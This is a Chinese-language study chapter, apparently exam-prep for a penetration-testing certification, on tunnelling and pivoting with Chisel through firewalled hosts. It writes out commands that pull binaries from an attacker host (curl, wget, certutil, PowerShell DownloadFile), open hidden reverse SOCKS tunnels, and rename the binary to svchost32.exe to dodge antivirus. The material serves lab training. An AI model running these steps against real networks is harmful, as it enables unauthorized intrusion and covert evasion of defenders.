# 第 66 章 - Chisel

## 標籤

- #cpts
- #chapter
- #chisel
- #pivoting

## 學習目標

- 理解 Chisel 把 TCP 流量包進 HTTP/WebSocket 的底層原理，知道為什麼這樣能穿防火牆。
- 掌握 server / client 每個選項的作用，能根據環境調整。
- 知道 reverse 和 forward 通道的差異，以及什麼情況用哪種。
- 能做雙跳 pivot，並在出問題時知道去哪裡查。

---

## 理論基礎：Chisel 為什麼能穿防火牆

### 一般 TCP 連線的問題

滲透環境中常見的限制：
- 目標機（跳板機）只允許對外的 HTTP/HTTPS 流量
- 沒有 SSH 服務，所以 `ssh -D` 用不了
- 防火牆擋住了所有不是 80/443 的出站 port

### Chisel 的解法

Chisel 把隧道流量偽裝成 HTTP 或 WebSocket 連線。從防火牆的角度來看，它只是一個普通的 HTTP 請求，所以能穿過去。

```
防火牆只允許 HTTP 出站

跳板機 → HTTP Upgrade → WebSocket → Kali:9001 → 防火牆放行
         （WebSocket 裡面藏著 SOCKS 或 TCP 轉發的流量）
```

### Chisel 的傳輸機制（為什麼多個連線不互相干擾）

1. Client 和 Server 建立 WebSocket 連線（外觀是 HTTP Upgrade 請求）
2. 雙方在這個 WebSocket 上跑一個多路復用協定（yamux）
3. 多個 TCP 連線可以在同一個 WebSocket 上並行，不互相干擾
4. 從外面看只有一條 HTTP 連線，但裡面可以同時跑 RDP、SMB、SOCKS 等

---

## Reverse vs Forward 通道（最重要的觀念）

這是 Chisel 最容易搞混的概念。

### Forward（正向，不加 R:）

```
跳板機（Client）主動連 → Kali（Server）
Kali 的工具送流量 → 隧道 → 跳板機 → 目標
```

Kali 開 Client，連到跳板機開的 Server。

### Reverse（反向，加 R:）

```
跳板機（Client）主動連出來 → Kali（Server）
Kali 上的 port 綁定 → 隧道 → 跳板機 → 目標
```

跳板機開 Client 連到 Kali，Kali 在本機開 port，流量塞進去透過隧道走。

**為什麼考試幾乎都用 Reverse（R:）？**

跳板機通常在防火牆後面，你的 Kali 無法主動連進去。但跳板機自己可以對外發 HTTP。所以讓跳板機主動連出來（繞過防火牆），Kali 再透過那條連線送流量進去。

| | Kali 跑什麼 | 跳板機跑什麼 | 何時用 |
|--|------------|------------|------|
| Forward | Client | Server | 你能直接連進跳板機，且跳板機有開對外 port |
| **Reverse（R:）** | **Server** | **Client** | **跳板機在防火牆後，自己連出來（考試 99% 這個）** |

---

## Server 選項完整說明

```bash
./chisel server -p 9001 --reverse
```

| 選項 | 作用 | 說明 |
|------|------|------|
| `server` | 跑 server 模式 | 等待 client 連進來 |
| `-p 9001` | 監聽 port | 自訂，可換成 `80` 或 `443` 來穿防火牆 |
| `--reverse` | 允許 reverse tunnel | **必須加**，否則 client 送來的 `R:` 指令會被拒絕 |
| `--host IP` | 綁定特定介面 | 預設 `0.0.0.0`（所有介面），不需要改 |
| `--key STRING` | 加密金鑰 | Server 和 Client 要一樣才能連，不加流量沒加密 |
| `--auth user:pass` | 基本認證 | Client 連線時要提供，多一層保護 |
| `--keepalive 30s` | Keepalive 間隔 | 防止防火牆因為閒置把連線斷掉，預設 25s |
| `-v` | verbose 輸出 | 排查問題時開，能看到每條連線的詳細狀態 |
| `--backend http://localhost:80` | 反向代理後端 | 讓 server port 同時服務正常 HTTP，偽裝成真網站 |

---

## Client 選項完整說明

```bash
./chisel client [選項] SERVER_IP:PORT [隧道定義...]
```

| 選項 | 作用 | 說明 |
|------|------|------|
| `client` | 跑 client 模式 | 主動連到 server |
| `SERVER_IP:PORT` | Server 地址 | IP 和 port，要和 server 的 `-p` 對應 |
| `--keepalive 10s` | Keepalive | 防止連線中斷，建議加 |
| `--max-retry-count 10` | 斷線重試次數 | 預設無限重試，設定次數後放棄 |
| `--max-retry-interval 30s` | 重試間隔上限 | 避免頻繁重試被偵測 |
| `--key STRING` | 加密金鑰 | 要和 server 一樣 |
| `--auth user:pass` | 認證 | 要和 server `--auth` 設的一樣 |
| `--proxy http://PROXY:PORT` | 透過 HTTP proxy 連 | 環境中有 Web proxy 時用（如公司 Proxy） |
| `-v` | verbose | 排查連線問題 |

---

## 隧道定義語法

格式：`[R:][本地端IP:]本地PORT:遠端IP:遠端PORT`

**`R:` = Reverse**，流量在 Kali 的 port 進，透過隧道到跳板機，再到目標。

### SOCKS proxy 模式

```bash
R:socks
# 在 Kali 的預設 1080 port 開 SOCKS5 proxy
# 「socks」是關鍵字，代表開代理而不是轉發到固定目標

R:1082:socks
# 指定用 1082 port（避免和其他 SOCKS 衝突）
# 什麼時候改 port？同時跑多條 Chisel 隧道時，每條要用不同 port
```

### 固定 Port Forward 模式

```bash
R:13389:172.16.139.35:3389
# 把 Kali localhost:13389 → 跳板機幫你連 172.16.139.35:3389
# 為什麼不用 3389 而用 13389？避免和 Kali 本機的 RDP 衝突

R:15985:172.16.139.35:5985
# 把 Kali localhost:15985 → 172.16.139.35:5985（WinRM）

R:8080:127.0.0.1:80
# 把 Kali:8080 → 跳板機自己的 80 port（存取跳板機本身的服務）
# 127.0.0.1 是從跳板機的角度來看，所以是跳板機本機
```

### 何時用 SOCKS vs 固定 Port Forward

```text
需要存取多個目標 / 整個網段 / 多種工具？
└── 用 R:socks（搭配 proxychains，靈活）

只需要固定的 1-2 個服務（例如只要 RDP 進去）？
└── 用 R:13389:TARGET:3389（直接，不需要 proxychains）
```

---

## 完整設定流程

### Step 1 — 下載 Chisel

```bash
# Kali 端
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel
# chmod +x → 加執行權限，下載的二進制預設沒有

# Windows 版（準備好待會上傳到跳板機）
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gunzip chisel_1.9.1_windows_amd64.gz
mv chisel_1.9.1_windows_amd64 chisel.exe
```

### Step 2 — Kali 啟動 Server

```bash
# 前景（看得到 log，排查用）
./chisel server -p 9001 --reverse -v

# 背景（考試正式用）
nohup ./chisel server -p 9001 --reverse > /tmp/chisel.log 2>&1 &
# nohup        → 終端關掉後程式繼續跑
# > file 2>&1  → stdout 和 stderr 都存到 log 檔案
# &            → 放到背景執行

# 確認 server 在跑
ss -tnlp | grep 9001
```

### Step 3 — 上傳 Chisel 到跳板機

```bash
# 方法一：Kali 開 HTTP server
python3 -m http.server 8000

# Linux 跳板機下載
curl http://KALI_IP:8000/chisel -o /tmp/chisel && chmod +x /tmp/chisel
wget http://KALI_IP:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# Windows 跳板機下載
(New-Object Net.WebClient).DownloadFile('http://KALI_IP:8000/chisel.exe','C:\Windows\Temp\chisel.exe')
certutil -urlcache -f http://KALI_IP:8000/chisel.exe C:\Windows\Temp\chisel.exe
# certutil 不需要 PowerShell，在 cmd 也能用

# evil-winrm 直接上傳
upload /tmp/chisel.exe C:\Windows\Temp\chisel.exe
```

### Step 4 — 跳板機執行 Client

```bash
# Linux（前景，測試用）
/tmp/chisel client KALI_IP:9001 R:socks

# Linux（背景）
nohup /tmp/chisel client KALI_IP:9001 R:socks > /tmp/chisel-c.log 2>&1 &

# Windows（背景，不顯示視窗）
Start-Process -WindowStyle Hidden -FilePath "C:\Windows\Temp\chisel.exe" `
  -ArgumentList "client KALI_IP:9001 R:socks"
# -WindowStyle Hidden → 不顯示黑色視窗（避免引起注意）
# -FilePath           → 執行檔的完整路徑
# -ArgumentList       → 傳給 chisel 的參數字串（一個大字串）

# Windows cmd（不需要 PowerShell）
start /b C:\Windows\Temp\chisel.exe client KALI_IP:9001 R:socks
# start /b → background，在目前視窗背景執行
```

### Step 5 — 確認連線成功

```bash
# Kali：看 SOCKS port 有沒有開
ss -tnlp | grep 1080
# 出現 127.0.0.1:1080 → 成功

# 看 chisel server log
cat /tmp/chisel.log
# 正常會看到：session#1: 跳板機IP → Connected

# 跳板機（Linux）：確認 client 在跑
ps aux | grep chisel
```

### Step 6 — 設定 proxychains

```bash
# 建立專用 conf（考試建議用這個，不改系統預設的）
cat > /tmp/pc.conf << 'EOF'
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
EOF

# dynamic_chain → 鏈中有 proxy 掛掉就跳過，不像 strict_chain 會卡死
# proxy_dns     → DNS 查詢也走 proxy，避免 DNS 洩漏和解析失敗
# tcp_read_time_out 15000  → 讀取超時 15 秒（proxy 環境延遲高，預設可能太短）
# tcp_connect_time_out 8000 → 連線超時 8 秒
```

---

## 場景範例

### 場景一：掃整個內網（SOCKS 模式）

```bash
# 跳板機
./chisel client KALI_IP:9001 R:socks

# Kali
proxychains4 -f /tmp/pc.conf nxc smb 172.16.139.0/24
proxychains4 -f /tmp/pc.conf nmap -sT -Pn -p 445,3389,5985 172.16.139.0/24
# -sT 必須！SOCKS proxy 不支援 SYN scan（不完整的三次握手）
# -Pn 不 ping，ICMP 通常穿不過 proxy
```

### 場景二：直接存取指定服務（Port Forward，不用 proxychains）

```bash
# 跳板機（同時開多個轉發）
./chisel client KALI_IP:9001 \
  R:13389:172.16.139.35:3389 \
  R:15985:172.16.139.35:5985

# Kali 直接用，目標是 127.0.0.1，port 是轉發的那個
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'Password!' /dynamic-resolution
evil-winrm -i 127.0.0.1 -P 15985 -u Administrator -p 'Password!'
```

### 場景三：穿防火牆（只允許 HTTP 80）

```bash
# Kali（需要 root 才能 bind 80，或用 authbind）
sudo ./chisel server -p 80 --reverse

# 跳板機
./chisel client KALI_IP:80 R:socks
.\chisel.exe client KALI_IP:80 R:socks   # Windows
```

---

## 雙跳 Pivot（二層內網）

```
Kali → DMZ01 (10.129.x.x) → SRV01 (172.16.139.35) → DC01 (192.168.1.3)
```

```bash
# ── 第一層：Kali ↔ DMZ01 ──

# Kali 開第一個 server
./chisel server -p 9001 --reverse

# DMZ01 連到 Kali（建立第一層通道 + 讓 SRV01 能連進來）
nohup /tmp/chisel server -p 9601 --reverse > /dev/null 2>&1 &
# DMZ01 自己也要開 server，讓 SRV01 的 chisel client 連進來

nohup /tmp/chisel client KALI_IP:9001 R:9601:127.0.0.1:9601 > /dev/null 2>&1 &
# 這條把 DMZ01 本機的 9601 port（剛開的 server）透過隧道轉到 Kali:9601
# 讓 SRV01 連 Kali:9601 就等於連到 DMZ01:9601

# ── 第二層：DMZ01 ↔ SRV01 ──

# SRV01 連到 Kali:9601（流量自動轉到 DMZ01 的 9601）
Start-Process -WindowStyle Hidden chisel.exe `
  -ArgumentList "client KALI_IP:9601 R:2224:socks"
# R:2224:socks → 在 Kali:2224 開 SOCKS proxy，流量走 SRV01

# ── Kali 使用第二層 ──

cat > /tmp/pc-layer2.conf << 'EOF'
dynamic_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 2224
EOF

proxychains4 -f /tmp/pc-layer2.conf nxc smb 192.168.1.0/24
```

---

## 確認 Chisel 狀態

```bash
# Kali
ss -tnlp | grep 9001   # server 在監聽嗎
ss -tnlp | grep 1080   # SOCKS 有開嗎（client 連進來後才有）
cat /tmp/chisel.log    # 有沒有 session 連線訊息

# Linux 跳板機
ps aux | grep chisel   # 程序在跑嗎
cat /tmp/chisel-c.log  # client 有成功連嗎

# Windows 跳板機
Get-Process | Where-Object { $_.Name -like "*chisel*" }
netstat -ano | findstr 9001   # 確認連線到 Kali
```

---

## 常見問題排查

| 現象 | 原因 | 解法 |
|------|------|------|
| Client 連不上 Server | 防火牆擋 9001 | 改 `-p 80` 或 `-p 443` |
| 連上了但 SOCKS 沒開 | 忘了 `R:` 或 server 沒加 `--reverse` | Server 加 `--reverse`，Client 用 `R:socks` |
| proxychains 超時 | DNS 解析走本機失敗 | conf 檔加 `proxy_dns` |
| 掃不到目標 | 跳板機路由問題 | 確認跳板機能直接 ping 到目標 |
| Chisel 不定時斷線 | 沒有 keepalive | 兩端加 `--keepalive 10s` |
| Windows 被 AV 殺 | 特徵碼 | 改名（`svchost32.exe`）或重編譯 |
| port 1080 被佔用 | 別的 SOCKS 在跑 | 改 `R:1082:socks`，conf 也改 |
| `bind: permission denied` | 80/443 需要 root | 改成高 port，或 `sudo ./chisel server` |

---

## Chisel vs SSH vs Ligolo-ng 決策

```text
跳板機是 Linux 且有 SSH 帳號？
├── 是，只需要 1-2 個服務 → ssh -L（不用上傳任何東西，最省事）
├── 是，需要掃整個網段 → ssh -D + proxychains
└── 否（Windows 或沒 SSH）
      需要穿 HTTP 防火牆？
      ├── 是 → Chisel（HTTP 模式，port 80/443）
      └── 否，需要 nmap SYN scan 或多工具長時間作業 → Ligolo-ng
```

---

## 速查表

```bash
# === Kali Server ===
./chisel server -p 9001 --reverse
nohup ./chisel server -p 9001 --reverse > /tmp/chisel.log 2>&1 &

# === 跳板機 Client ===
# Linux
./chisel client KALI_IP:9001 R:socks
# Windows（背景）
Start-Process -WindowStyle Hidden chisel.exe -ArgumentList "client KALI_IP:9001 R:socks"

# === proxychains conf ===
echo -e "dynamic_chain\nproxy_dns\n\n[ProxyList]\nsocks5 127.0.0.1 1080" > /tmp/pc.conf

# === 驗證 ===
ss -tnlp | grep 1080
proxychains4 -f /tmp/pc.conf nxc smb TARGET_IP

# === 固定 Port Forward（不用 proxychains）===
./chisel client KALI_IP:9001 R:13389:TARGET:3389 R:15985:TARGET:5985
xfreerdp /v:127.0.0.1:13389 ...
evil-winrm -i 127.0.0.1 -P 15985 ...

# === 穿防火牆 ===
sudo ./chisel server -p 80 --reverse
./chisel client KALI_IP:80 R:socks

# === 確認 ===
cat /tmp/chisel.log   # 看 session 有沒有連進來
ss -tnlp | grep 9001  # server
ss -tnlp | grep 1080  # SOCKS
```

## 關聯筆記

- [[64-網路路由基礎|第 64 章 - 網路路由基礎]]
- [[65-SSH埠轉發|第 65 章 - SSH 埠轉發]]
- [[67-Ligolo-ng|第 67 章 - Ligolo-ng]]
- [[68-ProxyChains|第 68 章 - ProxyChains]]
- [[08-Volume-8-Pivoting-Index|Vol.8 - Pivoting, Tunneling and Port Forwarding]]
